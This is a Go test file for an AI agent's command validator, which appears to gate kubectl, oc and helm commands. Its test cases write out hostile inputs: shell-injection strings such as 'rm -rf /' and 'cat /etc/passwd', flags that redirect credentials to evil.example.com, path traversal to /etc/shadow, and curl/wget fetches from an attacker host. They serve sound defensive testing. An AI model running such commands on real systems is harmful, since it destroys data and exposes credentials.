package agent

import (
	"testing"
)

// TestValidateMixedModeCommand_ShellInjection verifies shell injection is blocked.
func TestValidateMixedModeCommand_ShellInjection(t *testing.T) {
	cases := []struct {
		name    string
		command string
	}{
		{"semicolon chaining", "kubectl get pods; rm -rf /"},
		{"pipe", "kubectl get pods | cat /etc/passwd"},
		{"ampersand", "kubectl get pods && echo pwned"},
		{"background job", "kubectl get pods &"},
		{"subshell $(...)", "kubectl get pods $(whoami)"},
		{"backtick subshell", "kubectl get pods `id`"},
		{"input redirect", "kubectl apply < /etc/passwd"},
		{"output redirect", "kubectl get pods > /tmp/out"},
		{"dollar variable", "kubectl get pods $HOME"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(tc.command)
			if reason == "" {
				t.Errorf("expected rejection for %q, got approved", tc.command)
			}
			if requiresApproval {
				t.Errorf("shell injection %q should not be approval-eligible", tc.command)
			}
		})
	}
}

// TestValidateMixedModeCommand_AllowedReadOnly verifies safe read-only kubectl commands pass.
func TestValidateMixedModeCommand_AllowedReadOnly(t *testing.T) {
	allowed := []string{
		"kubectl get pods",
		"kubectl get nodes",
		"kubectl get deployments",
		"kubectl describe pod my-pod",
		"kubectl logs my-pod",
		"kubectl cluster-info",
		"kubectl config current-context",
		"kubectl config get-contexts",
		"kubectl config view",
		"kubectl rollout status deployment/my-app",
	}
	for _, cmd := range allowed {
		t.Run(cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if reason != "" {
				t.Errorf("expected %q to be allowed, got: requiresApproval=%v reason=%q", cmd, requiresApproval, reason)
			}
		})
	}
}

// TestValidateMixedModeCommand_RequiresApproval verifies mutating commands return approval-required.
func TestValidateMixedModeCommand_RequiresApproval(t *testing.T) {
	cases := []string{
		"kubectl apply",
		"kubectl delete pod my-pod",
		"kubectl create deployment nginx --image=nginx",
		"kubectl scale deployment my-app --replicas=3",
		"kubectl patch deployment my-app -p '{}'",
		"kubectl run nginx --image=nginx",
		"kubectl edit deployment my-app",
		"kubectl replace",
		"kubectl annotate pod my-pod key=value",
		"kubectl label pod my-pod key=value",
		"kubectl exec my-pod -- ls",
		"kubectl cp my-pod:/tmp/file /local/path",
		"kubectl drain node1",
		"kubectl cordon node1",
		"kubectl uncordon node1",
		"kubectl taint node node1 key=value:NoSchedule",
		"kubectl attach my-pod",
		"kubectl rollout restart deployment/my-app",
		"kubectl rollout undo deployment/my-app",
		"kubectl cluster-info dump",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if !requiresApproval || reason == "" {
				t.Errorf("expected %q to require approval, got: requiresApproval=%v reason=%q", cmd, requiresApproval, reason)
			}
		})
	}
}

// TestValidateMixedModeCommand_TransportOverride verifies auth/transport flag injection is blocked.
func TestValidateMixedModeCommand_TransportOverride(t *testing.T) {
	cases := []struct {
		name    string
		command string
	}{
		{"--kubeconfig", "kubectl get pods --kubeconfig=/evil/config"},
		{"--token", "kubectl get pods --token=eyJhbGci..."},
		{"--server", "kubectl get pods --server=https://evil.example.com"},
		{"--as", "kubectl get pods --as=admin"},
		{"--as-group", "kubectl get pods --as-group=system:masters"},
		{"--context", "kubectl get pods --context=evil-cluster"},
		{"--cluster", "kubectl get pods --cluster=evil"},
		{"--user", "kubectl get pods --user=admin"},
		{"--username", "kubectl get pods --username=admin"},
		{"--password", "kubectl get pods --password=secret"},
		{"--certificate-authority", "kubectl get pods --certificate-authority=/tmp/ca.crt"},
		{"--client-certificate", "kubectl get pods --client-certificate=/tmp/cert.pem"},
		{"--client-key", "kubectl get pods --client-key=/tmp/key.pem"},
		{"--insecure-skip-tls-verify", "kubectl get pods --insecure-skip-tls-verify"},
		{"-s short server flag", "kubectl get pods -s https://evil.example.com"},
		{"--kube-context", "kubectl get pods --kube-context=evil"},
		{"--tls-server-name", "kubectl get pods --tls-server-name=evil.example.com"},
		{"kubeconfig= equals form", "kubectl get pods --kubeconfig=/evil"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(tc.command)
			if reason == "" {
				t.Errorf("transport override %q should be blocked", tc.command)
			}
			if requiresApproval {
				t.Errorf("transport override %q should be hard-blocked (not approval-eligible)", tc.command)
			}
		})
	}
}

// TestValidateMixedModeCommand_DataFlags verifies --filename and --raw are blocked.
func TestValidateMixedModeCommand_DataFlags(t *testing.T) {
	cases := []struct {
		name    string
		command string
	}{
		{"--filename", "kubectl apply --filename=deployment.yaml"},
		{"-f file flag", "kubectl get pods -f myfile"},
		{"--raw", "kubectl get --raw /api/v1/pods"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, reason := validateMixedModeCommand(tc.command)
			if reason == "" {
				t.Errorf("data flag %q should be blocked", tc.command)
			}
		})
	}
}

// TestValidateMixedModeCommand_StreamingFlags verifies watch/follow flags are blocked.
func TestValidateMixedModeCommand_StreamingFlags(t *testing.T) {
	cases := []string{
		"kubectl get pods --watch",
		"kubectl get pods -w",
		"kubectl logs my-pod --follow",
		"kubectl logs my-pod -f",
		"kubectl logs my-pod --follow=true",
		"kubectl get pods --watch=true",
		"kubectl get pods --watch-only",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if reason == "" {
				t.Errorf("streaming flag in %q should be blocked", cmd)
			}
			if requiresApproval {
				t.Errorf("streaming flag in %q should be hard-blocked (not approval-eligible)", cmd)
			}
		})
	}
}

// TestValidateMixedModeCommand_SensitiveResources verifies secrets require approval.
func TestValidateMixedModeCommand_SensitiveResources(t *testing.T) {
	cases := []string{
		"kubectl get secret my-secret",
		"kubectl get secrets",
		"kubectl describe secret my-secret",
		"kubectl get secret,configmap",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if !requiresApproval || reason == "" {
				t.Errorf("sensitive resource %q should require approval, got: requiresApproval=%v reason=%q", cmd, requiresApproval, reason)
			}
		})
	}
}

// TestValidateMixedModeCommand_SensitiveOutput verifies structured output flags require approval.
func TestValidateMixedModeCommand_SensitiveOutput(t *testing.T) {
	cases := []string{
		"kubectl get pods -o json",
		"kubectl get pods -o yaml",
		"kubectl get pods -o jsonpath={.items[*].spec.containers[*].image}",
		"kubectl get pods -o go-template={{range .items}}{{.spec.nodeName}}{{end}}",
		"kubectl get pods --output=json",
		"kubectl get pods --output=custom-columns=NAME:.metadata.name",
		"kubectl get pods -o=yaml",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if !requiresApproval || reason == "" {
				t.Errorf("sensitive output %q should require approval, got: requiresApproval=%v reason=%q", cmd, requiresApproval, reason)
			}
		})
	}
}

// TestValidateMixedModeCommand_PathTraversal verifies path traversal in cp/exec is blocked.
func TestValidateMixedModeCommand_PathTraversal(t *testing.T) {
	cases := []struct {
		name    string
		command string
	}{
		{"cp local traversal", "kubectl cp ../secret.txt pod:/tmp/"},
		{"cp pod traversal", "kubectl cp pod:../../etc/passwd /tmp/"},
		{"cp nested traversal", "kubectl cp pod:/tmp/../../etc/shadow /tmp/"},
		{"exec -- traversal", "kubectl exec pod -- cat ../../etc/passwd"},
		{"exec -- cat traversal", "kubectl exec pod -- ls ../.."},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, reason := validateMixedModeCommand(tc.command)
			if reason == "" {
				t.Errorf("path traversal %q should be blocked", tc.command)
			}
		})
	}
}

// TestValidateMixedModeCommand_NonKubectl verifies only kubectl, oc, and helm are allowed.
func TestValidateMixedModeCommand_NonKubectl(t *testing.T) {
	blocked := []string{
		"bash -c 'cat /etc/passwd'",
		"sh -c id",
		"curl https://evil.example.com",
		"wget http://evil.example.com/exploit",
		"python3 -c 'import os; os.system(\"id\")'",
		"cat /etc/passwd",
		"rm -rf /",
		"apt-get install malware",
	}
	for _, cmd := range blocked {
		t.Run(cmd, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if reason == "" {
				t.Errorf("non-kubectl command %q should be blocked", cmd)
			}
			if requiresApproval {
				t.Errorf("non-kubectl command %q should be hard-blocked (not approval-eligible)", cmd)
			}
		})
	}
}

// TestValidateMixedModeCommand_Helm verifies helm commands.
func TestValidateMixedModeCommand_Helm(t *testing.T) {
	t.Run("read-only helm commands pass", func(t *testing.T) {
		readonly := []string{
			"helm list",
			"helm status my-release",
			"helm history my-release",
			"helm version",
		}
		for _, cmd := range readonly {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if reason != "" {
				t.Errorf("helm read-only %q should be allowed, got: requiresApproval=%v reason=%q", cmd, requiresApproval, reason)
			}
		}
	})
	t.Run("mutating helm commands require approval", func(t *testing.T) {
		mutating := []string{
			"helm install my-release ./chart",
			"helm upgrade my-release ./chart",
			"helm uninstall my-release",
			"helm rollback my-release 1",
		}
		for _, cmd := range mutating {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if !requiresApproval || reason == "" {
				t.Errorf("helm mutating %q should require approval, got: requiresApproval=%v reason=%q", cmd, requiresApproval, reason)
			}
		}
	})
	t.Run("unknown helm commands are blocked", func(t *testing.T) {
		requiresApproval, reason := validateMixedModeCommand("helm unknown-verb")
		if reason == "" {
			t.Error("unknown helm verb should be blocked")
		}
		if requiresApproval {
			t.Error("unknown helm verb should be hard-blocked, not approval-required")
		}
	})
}

// TestValidateMixedModeCommand_OC verifies oc is treated like kubectl.
func TestValidateMixedModeCommand_OC(t *testing.T) {
	requiresApproval, reason := validateMixedModeCommand("oc get pods")
	if reason != "" {
		t.Errorf("oc get pods should be allowed, got: requiresApproval=%v reason=%q", requiresApproval, reason)
	}

	requiresApproval, reason = validateMixedModeCommand("oc delete pod my-pod")
	if !requiresApproval || reason == "" {
		t.Errorf("oc delete should require approval, got: requiresApproval=%v reason=%q", requiresApproval, reason)
	}

	requiresApproval, reason = validateMixedModeCommand("oc get pods --token=evil")
	if reason == "" {
		t.Error("oc with --token should be blocked")
	}
	if requiresApproval {
		t.Error("oc with --token should be hard-blocked, not approval-eligible")
	}
}

// TestValidateMixedModeCommand_ConfigSubcommands verifies config read/mutate behavior.
func TestValidateMixedModeCommand_ConfigSubcommands(t *testing.T) {
	t.Run("read-only config subcommands pass", func(t *testing.T) {
		readonly := []string{
			"kubectl config current-context",
			"kubectl config get-contexts",
			"kubectl config view",
		}
		for _, cmd := range readonly {
			requiresApproval, reason := validateMixedModeCommand(cmd)
			if reason != "" {
				t.Errorf("%q should be allowed, got: requiresApproval=%v reason=%q", cmd, requiresApproval, reason)
			}
		}
	})
	t.Run("config view --raw requires approval", func(t *testing.T) {
		requiresApproval, reason := validateMixedModeCommand("kubectl config view --raw")
		if !requiresApproval || reason == "" {
			t.Errorf("kubectl config view --raw should require approval, got: requiresApproval=%v reason=%q", requiresApproval, reason)
		}
	})
	t.Run("config mutations are blocked", func(t *testing.T) {
		mutating := []string{
			"kubectl config set-context my-context",
			"kubectl config use-context my-context",
			"kubectl config set-cluster my-cluster",
			"kubectl config delete-context my-context",
		}
		for _, cmd := range mutating {
			_, reason := validateMixedModeCommand(cmd)
			if reason == "" {
				t.Errorf("config mutation %q should be blocked", cmd)
			}
		}
	})
}

// TestValidateMixedModeCommands_Batch verifies batch validation separates approved/rejected.
func TestValidateMixedModeCommands_Batch(t *testing.T) {
	commands := []string{
		"kubectl get pods",
		"kubectl delete pod evil-pod",
		"kubectl get nodes",
		"bash -c id",
		"",
		"   ",
		"helm list",
		"helm install evil-chart ./chart",
	}
	result := validateMixedModeCommands(commands)

	if len(result.Approved) != 3 {
		t.Errorf("expected 3 approved commands, got %d: %v", len(result.Approved), result.Approved)
	}
	if len(result.Rejected) != 3 {
		t.Errorf("expected 3 rejected commands, got %d", len(result.Rejected))
	}

	// Verify approved list contains correct commands
	approvedSet := map[string]bool{}
	for _, cmd := range result.Approved {
		approvedSet[cmd] = true
	}
	for _, expected := range []string{"kubectl get pods", "kubectl get nodes", "helm list"} {
		if !approvedSet[expected] {
			t.Errorf("expected %q in approved list", expected)
		}
	}
}

// TestHasMixedModePathTraversalSegment verifies the path segment checker.
func TestHasMixedModePathTraversalSegment(t *testing.T) {
	traversal := []string{"..", "../", "foo/../bar", "/a/b/../c", "..\\foo"}
	for _, v := range traversal {
		if !hasMixedModePathTraversalSegment(v) {
			t.Errorf("expected traversal for %q", v)
		}
	}
	safe := []string{"/tmp/file", "relative/path", "file.txt", ""}
	for _, v := range safe {
		if hasMixedModePathTraversalSegment(v) {
			t.Errorf("expected no traversal for %q", v)
		}
	}
}

// TestNormalizeMixedModeOutputFormat verifies output format normalization.
func TestNormalizeMixedModeOutputFormat(t *testing.T) {
	cases := []struct {
		input    string
		expected string
	}{
		{"json", "json"},
		{"JSON", "json"},
		{"yaml", "yaml"},
		{"=json", "json"},
		{"jsonpath={.items[*]}", "jsonpath"},
		{"jsonpath-file=./tmpl.txt", "jsonpath"},
		{"go-template={{.name}}", "go-template"},
		{"go-template-file=./tmpl.txt", "go-template"},
		{"custom-columns=NAME:.metadata.name", "custom-columns"},
		{"custom-columns-file=./cols.txt", "custom-columns"},
		{"name", "name"},
		{"wide", "wide"},
	}
	for _, tc := range cases {
		got := normalizeMixedModeOutputFormat(tc.input)
		if got != tc.expected {
			t.Errorf("normalizeMixedModeOutputFormat(%q) = %q, want %q", tc.input, got, tc.expected)
		}
	}
}

// TestValidateMixedModeCommand_EmptyAndWhitespace verifies edge cases.
func TestValidateMixedModeCommand_EmptyAndWhitespace(t *testing.T) {
	requiresApproval, reason := validateMixedModeCommand("")
	if reason == "" {
		t.Errorf("empty command should be rejected, got: requiresApproval=%v", requiresApproval)
	}
}

// TestHasMixedModeStreamingFlag verifies streaming flag detection.
func TestHasMixedModeStreamingFlag(t *testing.T) {
	streaming := [][]string{
		{"-w"},
		{"-f"},
		{"--watch"},
		{"--watch=true"},
		{"--watch-only"},
		{"--follow"},
		{"--follow=true"},
	}
	for _, args := range streaming {
		if !hasMixedModeStreamingFlag(args) {
			t.Errorf("expected streaming flag in %v", args)
		}
	}
	nonStreaming := [][]string{
		{"get", "pods"},
		{"--output=json"},
		{"--namespace=default"},
		{"-n", "default"},
	}
	for _, args := range nonStreaming {
		if hasMixedModeStreamingFlag(args) {
			t.Errorf("unexpected streaming flag in %v", args)
		}
	}
}

// TestTouchesMixedModeSensitiveKubectlResource covers secret resource detection.
func TestTouchesMixedModeSensitiveKubectlResource(t *testing.T) {
	sensitive := [][]string{
		{"get", "secret", "my-secret"},
		{"get", "secrets"},
		{"describe", "secret", "my-secret"},
		{"get", "secret,configmap"},
	}
	for _, args := range sensitive {
		if !touchesMixedModeSensitiveKubectlResource(args) {
			t.Errorf("expected sensitive resource in %v", args)
		}
	}
	notSensitive := [][]string{
		{"get", "pods"},
		{"get", "configmap", "my-cm"},
		{"delete", "secret", "my-secret"}, // only get/describe triggers this check
		{},
	}
	for _, args := range notSensitive {
		if touchesMixedModeSensitiveKubectlResource(args) {
			t.Errorf("unexpected sensitive resource in %v", args)
		}
	}
}
